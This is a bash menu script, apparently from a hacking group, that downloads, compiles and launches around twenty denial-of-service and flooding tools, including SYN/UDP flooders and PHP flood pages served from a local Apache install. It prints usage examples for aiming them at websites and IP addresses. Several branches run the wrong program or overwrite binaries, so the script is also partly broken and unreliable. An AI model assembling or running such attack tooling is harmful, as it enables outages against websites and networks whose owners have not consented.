#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"

echo -e $RED ""
figlet Starting...

sleep 1
clear

echo -e $MAGENTA "
  ___  ___      ___   _____         _    
 |   \|   \ ___/ __| |_   _|__  ___| |___
 | |) | |) / _ \__ \   | |/ _ \/ _ \ (_-<
 |___/|___/\___/___/   |_|\___/\___/_/__/                                 
                           by @viperzcrew
"
echo ""
echo -e $BLUE "
[?] Which tool do you want to install?

[1] Ha3MrX's DDoSer
[2] HPING3 (Only Linux! --> No Termux!)
[3] Anevicon (Only Linux! --> No Termux!)
[4] Xerxes
[5] PyDDoZ
[6] Dark Fantasy
[7] DDoS Anoymous
[8] DDoS Pack v1 (11 Tools) (Only Linux! --> No Termux!)
[9] Hammer
[10] Torshammer 
[11] fl00d & fl00d2
[12] GoldenEye
[13] Planetwork DDoS Tool
[14] Hulk
[15] LITE DDoS
[16] PyFlooder
[17] UfoNet
[18] Pentmenu Multi Tool
[19] Unstable DDoS Tool
[20] ZAmbie 
[21] WAScan 
[99] Exit"

echo -e $BLUE "[*] More Tools Coming Soon!!"

echo -e $GREEN ""
read -p "Enter a number: " inp1

if [[ "$inp1" = 1 ]]; then
	cd /$HOME
	apt install python git -y
	git clone https://github.com/Ha3MrX/DDos-Attack
	cd DDos-Attack
	chmod +x ddos-attack.py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python ddos-attack.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 2 ]]; then
	apt install hping3
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		hping3 -h
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 3 ]]; then
	cd /$HOME
	git clone https://github.com/Gymmasssorla/anevicon
	cd anevicon
	cargo build --release
	clear
    read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		anevicon
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 4 ]]; then
	cd /$HOME
	git clone https://github.com/zanyarjamal/xerxes
	cd xerxes
	gcc xerxes.c -o xerxes
	clear
	echo -e $RED "USAGE : ./xerxes www.fakesite.com 80"
	read -p " [+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		echo -e  "\e[31mUSAGE : ./xerxes www.fakesite.com 80" >> usage.txt
		clear
		cat usage.txt
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 5 ]]; then
	cd /$HOME
	apt install python -y
	git clone https://github.com/0x01h/pyddoz
	cd pyddoz
	pip3 install -r requirements.txt
	clear
	read -p " [+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python3 pyddoz.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 6 ]]; then
	cd /$HOME 
	apt install python2
	git clone https://github.com/ritvikb99/dark-fantasy-hack-tool
	pip2 install html2text
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		python2 dark-fantasy-2.0.3.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi

if [[ "$inp1" = 7 ]]; then
	cd /$HOME
	apt install git 
    git clone https://github.com/M0HAM3D/DDos-Anonymous
    cd DDos-Anonymous
	bash install.sh -y
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		cat README.md
		sleep 2
		python2 DDos-anonymous.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi    
    
if [[ "$inp1" = 8 ]]; then
	cd /$HOME
	apt update && apt upgrade -y
	apt install gcc net-tools php php-dev -y
	apt-get install libapr1-dev libaprutil1-dev -y
	curl -LO https://www-eu.apache.org/dist//httpd/httpd-2.4.39.tar.gz
	tar -xvzf httpd-2.4.39.tar.gz
	mv -v httpd-2.4.39 /usr/local/src
	cd httpd-2.4.39
	clear
	echo -e $RED "[!] Installing all scripts, this could need a while!"
	sleep 2
	./configure --enable-so
	make
	make install
	cd /usr/local/apache2/bin
	./apachectl start
	cd /usr/local/src
	curl -LO https://www.php.net/distributions/php-7.3.6.tar.bz2
	tar -xvf php-7.3.6.tar.bz2
	cd php-7.3.6
	apt-get install libxml2-dev
    ./configure --with-apxs2=/usr/local/apache2/bin/apxs
    make
    apt-get install libtool-bin
    libtool --finish /usr/local/src/php-7.3.6/libs
    make install
    cp -r php.ini-developement /usr/local/lib/php.ini
    /usr/local/src/php-7.3.6/build/shtool install -c ext/phar/phar.phar /usr/local/bin
    echo "SetHandler application/x-httpd-php" >> /usr/local/apache2/conf/httpd.conf
    restart
    git clone https://github.com/vbooter/DDoS-Scripts
    cd DDoS-Scripts
	clear
	gcc 50x.c -pthread -o ssyn
	gcc ARME.c -pthread -o ssyn
	gcc RUDY.c -pthread -o ssyn
	gcc SLOWLORIS.c -pthread -o ssyn
	gcc SSYN2.c -pthread -o ssyn
	gcc SUDP.c -pthread -o ssyn
	gcc SUDP.c -pthread -o ssyn
	gcc TCP.c -pthread -o ssyn
	gcc UDP.c -pthread -o ssyn
	mv -v 'TCP Shell.php' tcp_shell.php
	mv -v 'UDP Shell.php' udp_shell.php
	cp -r ucp_shell.php /usr/local/apache2/htdocs
    cp -r tcp_shell.php /usr/local/apache2/htdocs
	clear
	echo "[*] For uploading a PHP script, copy the php script to /usr/local/apache2/htdocs and type:
	$ firefox 127.0.0.1/name.php
	i have copied your files to htdocs, simply type for UDP:
	$ firefox localhost/udp_shell.php
	TCP:
	$ firefox localhost/tcp_shell.php
	Normal usage:
	§ ./[script-name] ip port time(commands)"
	
	read -p "Type B for going back to the script, or hold CTRL+C to exit" $run
	if [[ "$run" = "B" || "$run" = "b" ]]; then
		clear
		echo "To see the folder type:
		cd /$HOME/DDoS-Scripts && ls
		going back to the downloader site..
		"
		sleep 1
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi    	
	
if [[ "$inp1" = 9 ]]; then
	cd /$HOME
	git clone https://github.com/cyweb/hammer
	cd hammer && chmod 777 hammer.py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python3 hammer.py -h
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  

if [[ "$inp1" = 10 ]]; then
	cd /$HOME
	git clone https://github.com/dotfighter/torshammer
	cd torshammer && chmod 777 *py
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 torshammer.py -h
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 11 ]]; then
	cd /$HOME
	curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d.py
	curl -O https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/scripts/fl00d2.py
	mkdir ~/fl00d
	mv fl00d.py ~/fl00d && mv fl00d2.py ~/fl00d
	clear
	read -p "[+] Do you want to run the fl00d2 ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 fl00d2.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 12 ]]; then
	cd /$HOME
	git clone https://github.com/jseidl/GoldenEye && cd GoldenEye
	chmod +rwx *py
	service tor start
	clear
	echo -e $RED "[*] USAGE: ./goldeneye.py https://website.com [OPTONS]"
	echo -e $RESTORE
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./goldeneye.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  	

if [[ "$inp1" = 13 ]]; then
	cd /$HOME
	git clone https://github.com/Hydra7/Planetwork-DDOS
	cd Planetwork-DDOS
	clear
	echo -e $RED "[*] USAGE: python2 pntddos.py ip port counts
	exampple:
	$ python2 pntddos.py 192.168.0.1 80 65000"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python2 pntddos.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  		

if [[ "$inp1" = 14 ]]; then
	cd /$HOME
	git clone https://github.com/darkwarrior3/hulk && cd hulk
	chmod +rwx hulk.py
	clear
	echo -e $RED "[*] USAGE: python hulk.py <url>"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python hulk.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi  

if [[ "$inp1" = 15 ]]; then
	git clone https://github.com/4L13199/LITEDDOS
	cd LITEDDOS && chmod 777 *py
	clear
	echo -e $RED "[*] USAGE: python2 LITEDDOS.py (IP) (PORT) (COUNT)"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python hulk.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 16 ]]; then
	cd /$HOME
	git clone https://github.com/D4Vinci/PyFlooder
	cd PyFlooder && chmod +rwx *
	clear
	echo -e $RED "USAGE: python pyflooder.py (IP)(PORT)(COUNT)"
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python hulk.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 17 ]]; then
	cd /$HOME
	git clone https://github.com/epsylon/ufonet
	cd ufonet && chmod 777 *
	apt install python-pycurl
	pip install geoip requests pycrypto scrapy whois
	python setup.py install
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./ufonet --gui 
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 18 ]]; then
	cd /$HOME
	git clone https://github.com/chetan31295/pentmenu
	cd pentmenu && chmod +rwx *
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./pentmenu 
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 19 ]]; then
	cd /$HOME
	git clone https://github.com/iJoshoa/UnstableDDoS
	cd UnstableDDoS && chmod +rwx *
	pip3 install pysocks bs4 scapy-python3
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python3 UNSTABLE.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 

if [[ "$inp1" = 20 ]]; then
	/$HOME
	git clone https://github.com/zanyarjamal/zambie.git
	cd zambie && chmod +rwx *
	./Installer.sh
	clear
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		./zambie.py
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi 
	
if [[ "$inp1" = 21 ]]; then
	cd /$HOME
	git clone https://github.com/m4ll0k/Spaghetti
	cd Spaghetti && chmod +rwx *
	clear
	echo -e $RED [*] USAGE: wascan.py --url http://www.site.com/
	read -p "[+] Do you want to run the ddos-tool?[Y/N] " run
	if [[ "$run" = "Y" || "$run" = "y" ]]; then
		clear
		python wascan.py -h
	else 
		cd /$HOME/Desktop/DDoS_Downloader
		bash downloader.sh
	fi
fi	

if [[ "$inp1" = 99 ]]; then
	clear
	echo -e $MAGENTA "Exiting..."
	echo -e $BLUE "Thanks for using our script."
	echo -e $GREEN "[*]" echo $YELLOW"Successfully closed!"
	exit
fi
